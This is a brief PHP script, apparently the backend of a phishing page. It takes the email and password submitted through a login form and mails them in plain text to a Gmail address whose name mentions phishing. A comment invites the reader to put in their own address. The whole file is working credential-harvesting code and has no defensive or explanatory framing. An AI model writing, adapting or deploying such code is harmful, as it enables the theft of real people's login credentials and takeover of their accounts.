<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['pass'];

    $to = "testg2phishing@gmail.com"; // Replace with your actual email
    $subject = "New Login Attempt";
    $message = "Email: " . $email . "\nPassword: " . $password;
    $headers = "From: noreply@example.com" . "\r\n" .
               "Reply-To: noreply@example.com" . "\r\n" .
               "X-Mailer: PHP/" . phpversion();

    mail($to, $subject, $message, $headers);
}
?>
